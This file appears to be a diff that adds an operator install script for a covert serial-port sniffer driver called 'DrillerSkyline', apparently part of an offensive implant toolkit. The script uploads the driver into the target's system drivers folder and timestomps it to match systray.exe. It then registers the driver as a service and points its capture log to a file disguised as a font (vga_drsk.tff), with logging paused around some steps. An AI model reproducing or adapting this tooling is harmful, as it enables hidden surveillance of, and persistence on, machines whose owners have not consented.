@@ -1,0 +1,185 @@
+#--------------------------------------------------------
+# File: Install.eps
+#
+# Wrapper script for Install of DrillerSkyline
+#
+# Modifications:
+#  08/22/06	Stolen from DoorwayNapkin/Install.eps.
+#--------------------------------------------------------
+@include "_DriverIncludes.epm";
+@include "_GetSystemVersion.epm";
+
+@echo off;
+
+if (($argc < 2) || ($argc > 3)) {
+    echo "Usage: $argv[0] <driverName> [captureFile]";
+    return false;
+}
+
+string $driver = $argv[1];
+string $captureFile = "\\SystemRoot\\Fonts\\vga_drsk.tff";
+if ($argc >= 3) {
+    $captureFile = $argv[2];
+}
+
+# check to make sure we're NT 4 Sp4 or higher
+int $majorVersion;
+int $minorVersion;
+int $buildNumber;
+int $platformId;
+int $spMajorVersion;
+int $spMinorVersion;
+ifnot (_GetSystemVersion($majorVersion, $minorVersion, $buildNumber, $platformId, $spMajorVersion, $spMinorVersion)) {
+    echo "Unable to get system version -- manually verify that";
+    echo "the target system is Windows 2000 or greater";
+    pause;
+} else if (($majorVersion < 5)) {
+    # NT 4 or less
+    echo "*** Target system is pre-Win 2k. ***";
+    echo "    DrillerSkyline is not compatible with this system";
+    return false;
+}
+
+ifnot (DriverInstall("serstat", $driver, "DrillerSkyline", 2, 1)) {
+    return false;
+}
+
+# add capture file
+echo "Adding additional registry key";
+ifnot(`serialsniffer -driver $driver -setlogfile "$captureFile"`) {
+    echo "    FAILED";
+    return false;
+} else {
+    echo "    SUCCESS";
+}
+
+# size in kilos
+int $maxSize = 512;
+$maxSize *= 1024;
+
+# add extra registry key
+echo "Setting default maximum size to $maxSize bytes";
+ifnot (`serialsniffer -setmaxlogsize $maxSize -driver $driver` ) {
+    echo "    FAILED";
+    return false;
+} else {
+    echo "    SUCCESS";
+}
+
+return true;
+
+
+#--------------------------------------------------------------------------
+# _DriverInstall
+#	Copies driver to target and creates registry settings.
+# 
+# Params:
+#	IN STRING $drvName
+#		Name of Driver
+#	IN STRING $localDriverName
+#		Local name of the driver relative to the "Resources" dir
+#	IN INT $startValue
+#		Start value for driver (registry value)
+#	IN INT $typeValue
+#		Type of driver (registry value)
+#--------------------------------------------------------------------------
+sub DriverInstall(IN STRING $localDrvName, 
+		   IN STRING $drvName,
+		   IN STRING $localDriverName,
+		   IN INT $startValue,
+		   IN INT $typeValue)
+{
+	
+	if ($drvName == "") {
+		echo "* Invalid driver name given";
+		return false;
+	}
+
+	ifnot (prompt "Do you want to install $localDriverName\\$drvName?") {
+		return false;
+	}
+
+
+	@record on;
+
+	# get the root directory
+	string $system;
+	string $root;
+	ifnot (_GetSystemPaths($system, $root)) {
+		echo "* Unable to determine system root";
+		return false;
+	}
+	string $systemroot = "$system\\$root";
+
+	# get resource directory
+	ifnot (`getdirectory -resources`) {
+		echo "* Unable to get resources directory";
+		return false;
+	}
+
+	string $resDir = GetCmdData("dir");
+	ifnot (defined($resDir[0])) {
+		echo "* Unable to retrieve resources directory";
+		return false;
+	}
+	
+	string $resPath = "$resDir\\$localDriverName";
+
+	@record off;
+
+	# make sure it's not already installed
+	if (`regquery -hive L -subkey SYSTEM\\CurrentControlSet\\Services\\$drvName`) {
+		echo "$drvName is already installed (key exists)";
+		return false;
+	}
+
+	if (_FileExists("$drvName.sys", "$systemroot\\drivers")) {
+		echo "$drvName is already installed (file exists)";
+		return false;
+	}
+
+	#---------------------------
+	# Driver not installed
+	#---------------------------
+
+	# put the driver
+	echo "Uploading the SYS";
+	
+	if (`put "$resPath\\$localDrvName.sys" -name "$systemroot\\drivers\\$drvName.sys" -permanent`) {
+		echo "    SUCCESS";
+	} else {
+		echo "    FAILED";
+		return false;
+	}
+
+	# match file times for driver
+	echo "Matching file time for SYS";
+	if (`matchtimes "$systemroot\\systray.exe" "$systemroot\\drivers\\$drvName.sys"`) {
+		echo "    SUCCESS";
+	} else {
+		echo "    FAILED (but continuing anyway)";
+	}
+
+	# add the registry keys
+	bool $keysAdded = true;
+	echo "Adding registry keys";
+	ifnot (`regadd -hive L -key SYSTEM\\CurrentControlSet\\Services\\$drvName -value ErrorControl -type REG_DWORD -data 0`) {
+	    $keysAdded = false;
+	} else ifnot (`regadd -hive L -key SYSTEM\\CurrentControlSet\\Services\\$drvName -value Start -type REG_DWORD -data $startValue`) {
+	    $keysAdded = false;
+	} else ifnot (`regadd -hive L -key SYSTEM\\CurrentControlSet\\Services\\$drvName -value Type -type REG_DWORD -data $typeValue`) {
+	    $keysAdded = false;
+	}
+
+	if ($keysAdded == false) {
+	    echo "    FAILED";
+	    return false;
+	} else {
+	    echo "    SUCCESS";
+	}
+
+
+
+	return true;
+
+}	/* end _DriverInstall */
